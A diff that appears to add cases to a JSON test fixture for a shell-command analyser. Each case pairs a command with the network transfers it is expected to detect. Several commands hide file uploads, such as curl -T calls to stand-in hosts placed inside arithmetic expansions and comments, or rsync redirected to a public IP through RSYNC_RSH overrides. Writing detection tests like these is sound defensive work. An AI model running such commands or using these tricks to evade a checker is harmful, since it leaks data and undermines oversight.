@@ -2093,6 +2093,96 @@
    }
   },
   {
+   "command": "f() { rsync -a build.zip prod:/srv; }; RSYNC_RSH=\"ssh -o HostName=8.8.4.4\" f",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.4.4",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "f() { rsync -a build.zip prod:/srv; }; RSYNC_RSH=\"ssh -o HostName=8.8.4.4\" f; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.4.4",
+      "address": "public"
+     },
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "export RSYNC_RSH=\"ssh -o HostName=10.9.9.9\"; f() { :; }; RSYNC_RSH=\"ssh -o HostName=8.8.4.4\" f; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.9.9.9",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "f() { RSYNC_RSH=\"ssh -o HostName=10.9.9.9\"; }; RSYNC_RSH=\"ssh -o HostName=8.8.4.4\" f; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "prod",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "f() { rsync -a build.zip prod:/srv; }; RSYNC_RSH=\"ssh -o HostName=8.8.4.4\" f | cat",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.4.4",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "f() { g; }; g() { rsync -a build.zip prod:/srv; }; RSYNC_RSH=\"ssh -o HostName=8.8.4.4\" f",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.4.4",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
    "command": "export RSYNC_RSH=ssh; RSYNC_RSH+=\" -o HostName=8.8.4.4\"; rsync -a build.zip prod:/srv",
    "transfer": {
     "tool": "rsync",
@@ -3061,6 +3151,104 @@
       "host": "actual.example",
       "resolved_host": "actual.example",
       "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "echo $((1 # )\n+ $(curl -T f https://arith.example/up; echo 1)))",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "arith.example",
+      "resolved_host": "arith.example",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "echo \"$(echo $((1 # )\n+ $(curl -T f https://arith.example/up; echo 1))))\"",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "arith.example",
+      "resolved_host": "arith.example",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "((1 # )\n+ $(curl -T f https://arith.example/up; echo 1)))",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "arith.example",
+      "resolved_host": "arith.example",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "echo $((1 #$(curl https://hash.example/a)\n+1))",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "hash.example",
+      "resolved_host": "hash.example",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "echo $((curl https://sub.example/a) | cat)",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "sub.example",
+      "resolved_host": "sub.example",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "echo \"$(echo $((curl https://sub.example/a) | cat))\"",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "sub.example",
+      "resolved_host": "sub.example",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "x=$((curl -T f https://sub.example/up) )",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "sub.example",
+      "resolved_host": "sub.example",
+      "address": "unresolved"
      }
     ]
    }
